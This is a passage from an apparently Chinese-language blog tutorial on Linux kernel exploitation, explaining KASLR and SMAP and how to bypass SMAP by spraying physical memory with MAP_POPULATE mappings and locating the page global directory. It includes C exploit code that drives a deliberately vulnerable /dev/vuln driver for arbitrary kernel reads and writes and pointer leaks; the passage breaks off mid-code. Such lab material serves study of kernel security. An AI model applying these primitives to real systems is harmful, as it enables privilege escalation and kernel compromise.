11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>KASLR就不多解释了，就是一个kernel的地址随机化</p></blockquote>\n<h3 id=\"SMAP\"><a href=\"#SMAP\" class=\"headerlink\" title=\"SMAP\"></a>SMAP</h3><p>​        SMAP是<code>Supervisor Mode Access Prevention</code>，它使得用户态的指针无法在内核态被解引用，这无疑会使得ROP难以有效使用。</p>\n<p>​        在qemu里面<code>-cpu kvm64,smep,smap</code>表明开启了SMAP机制，当然<code>cat /proc/cpuinfo | grep smap</code>也可以看出来。</p>\n<h3 id=\"SMAP-bypass\"><a href=\"#SMAP-bypass\" class=\"headerlink\" title=\"SMAP bypass\"></a>SMAP bypass</h3><p>​        通过分析linux kernel的mmap实现其实就可以知道我们可以通过类似linux kernel heap spray的方式将用户空间的代码映射到内核里面，只需要用<strong>MAP_POPULATE</strong>的flag:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">MAP_POPULATE (since Linux 2.5.46)\n       Populate (prefault) page tables for a mapping.  For a file mapping, this causes read-ahead on the file.  This will help to reduce blocking on page faults later.  The mmap() call doesn't fail if the mapping cannot be populated (for example, due to limitations on the number of mapped huge pages when using MAP_HUGETLB).  MAP_POPULATE is supported for private mappings only since Linux 2.6.23.<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>这是因为在通过该flag进行mmap的时候，物理页也会同时被映射而不是想之前按需映射的方式。下面是一个github提供的demo可以测算可mmap的地址大小：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/fcntl.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/mman.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h&gt;</span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">int</span> cnt <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>pg<span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\tpg <span class=\"token operator\">=</span> <span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">,</span> PROT_READ<span class=\"token operator\">|</span>PROT_WRITE<span class=\"token punctuation\">,</span> MAP_ANONYMOUS<span class=\"token operator\">|</span>MAP_PRIVATE<span class=\"token operator\">|</span>MAP_POPULATE<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pg <span class=\"token operator\">==</span> MAP_FAILED<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mmap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n\t\t\tcnt<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>cnt <span class=\"token operator\">%</span> <span class=\"token number\">1000</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] allocated %d pages, asking for more...\\n\"</span><span class=\"token punctuation\">,</span> cnt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] number of pages allocated: %d\\n\"</span><span class=\"token punctuation\">,</span> cnt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>通过实验得出结论就是尽管RAM很小，但是最大mmap的值是它的数倍，同时该值会根据内存资源的大小来发生变化。同时物理页的分配有一个特点，<strong>那就是它们一般都是连续分配的</strong>。如此通过大量的mmap地址并填充信息，最终其实是可以在内核里面访问到这些信息的，如此就可以绕过SMAP的保护，因为我们不需要再解析用户态的指针，而是通过内核地址进行代码执行。</p>\n<p>​        那么应该如何获得物理地址呢？通过<a href=\"https://www.kernel.org/doc/gorman/html/understand/understand006.html\">文档</a>发现，在Linux中每一个进程都维护一个指针<code>mm_struct-&gt;pgd</code>指向该进程的**Page Global Directory (PGD)**，表里面包含的是<code>pgd_t</code>数组，pgd_t定义在<code>asm/page.h</code>里面根据不同的架构拥有不同的值，在x86架构下<code>mm_struct-&gt;pgd</code>会被复制到cr3寄存器。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220321164429738.png\" alt=\"image-20220321164429738\"></p>\n<p>​        可以知道通过mmap拿到的是虚拟地址，因此需要做一个虚拟地址到屋里地址之间的转换，那么如何获取cr3或者说pgd的值呢，一方面可以通过内核获取另一方面可以通过<code>/proc/(pid)/pagemap</code>获取，还有一种很奇特的方法即是通过映射64bit的[39:48]形成的地址，这里一共是0xff个地址，此时在物理页表中就会生成大量稠密的地址，这些地址会有一些特征，比如：</p>\n<ol>\n<li>最高位为1。</li>\n<li>最低字节为0x67。</li>\n</ol>\n<p>那么就可以通过遍历内核地址（一般从pageOffsetBase + (0x7c000 &lt;&lt; 12)开始）中的值来判断是否符合自己刚才通过spraying注入的大量地址，如果一个地址的内容符合自己注入的地址，同时索引0x100的结果为0，那么基本就能确定PGD的地址了。</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/fcntl.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/mman.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h&gt;</span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">VULN_READ</span> <span class=\"token expression\"><span class=\"token number\">0x1111</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">VULN_WRITE</span> <span class=\"token expression\"><span class=\"token number\">0x2222</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">VULN_STACK</span> <span class=\"token expression\"><span class=\"token number\">0x3333</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">VULN_PGD</span> <span class=\"token expression\"><span class=\"token number\">0x4444</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">VULN_PB</span> <span class=\"token expression\"><span class=\"token number\">0x5555</span></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">SPRAY_CNT</span> <span class=\"token expression\"><span class=\"token number\">0x10000</span></span></span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">rwRequest</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>kaddr<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>uaddr<span class=\"token punctuation\">;</span>\n\t<span class=\"token class-name\">size_t</span> length<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> pageOffsetBase <span class=\"token operator\">=</span> <span class=\"token number\">0xffff888000000000</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">Open</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>fname<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> mode<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">int</span> fd<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span>fname<span class=\"token punctuation\">,</span> mode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"open\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> fd<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">write64</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> kaddr<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">rwRequest</span> req<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> value_ <span class=\"token operator\">=</span> value<span class=\"token punctuation\">;</span>\n\n\treq<span class=\"token punctuation\">.</span>uaddr <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>value_<span class=\"token punctuation\">;</span>\n\treq<span class=\"token punctuation\">.</span>length <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n\treq<span class=\"token punctuation\">.</span>kaddr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>kaddr<span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">Open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/vuln\"</span><span class=\"token punctuation\">,</span> O_RDONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> VULN_WRITE<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>req<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ioctl\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token function\">read64</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> kaddr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">rwRequest</span> req<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> value<span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span>\n\n\treq<span class=\"token punctuation\">.</span>uaddr <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>value<span class=\"token punctuation\">;</span>\n\treq<span class=\"token punctuation\">.</span>length <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n\treq<span class=\"token punctuation\">.</span>kaddr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>kaddr<span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">Open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/vuln\"</span><span class=\"token punctuation\">,</span> O_RDONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> VULN_READ<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>req<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ioctl\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">return</span> value<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token function\">leak_stack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">rwRequest</span> req<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> stack<span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">Open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/vuln\"</span><span class=\"token punctuation\">,</span> O_RDONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\treq<span class=\"token punctuation\">.</span>uaddr <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>stack<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> VULN_STACK<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>req<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ioctl\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">return</span> stack<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token function\">leak_pgd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">rwRequest</span> req<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> pgd <span class=\"token operator\">=</span> <span class=\"token number\">0xcccccccc</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">Open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/vuln\"</span><span class=\"token punctuation\">,</span> O_RDONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\treq<span class=\"token punctuation\">.</span>uaddr <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>pgd<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> VULN_PGD<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>req<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ioctl\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">return</span> pgd<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token function\">leak_physmap_base</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">rwRequest</span> req<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> pgd <span class=\"token operator\">=</span> <span class=\"token number\">0xcccccccc</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">Open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/vuln\"</span><span class=\"token punctuation\">,</span> O_RDONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\treq<span class=\"token punctuation\">.</span>uaddr <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>pgd<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> VULN_PB<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>req<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ioctl\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">return</span> pgd<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">check_page</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> addr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> page<span class=\"token punctuation\">[</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x101</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\tpage<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">read64</span><span class=\"token punctuation\">(</span>addr <span class=\"token operator\">+</span> i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>page<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>page<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">63</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token keyword\">return</span> page<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n\n\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>pg<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> search_addr<span class=\"token punctuation\">;</span>\n\t\n\tsearch_addr <span class=\"token operator\">=</span> pageOffsetBase <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x7c000</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\tpg <span class=\"token operator\">=</span> <span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">39</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">,</span> PROT_READ<span class=\"token operator\">|</span>PROT_WRITE<span class=\"token punctuation\">,</span> MAP_POPULATE<span class=\"token operator\">|</span>MAP_PRIVATE<span class=\"token operator\">|</span>MAP_ANONYMOUS<span class=\"token operator\">|</span>MAP_FIXED<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pg <span class=\"token operator\">==</span> MAP_FAILED<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mmap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] starting search from addr %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>search_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">check_page</span><span class=\"token punctuation\">(</span>search_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token 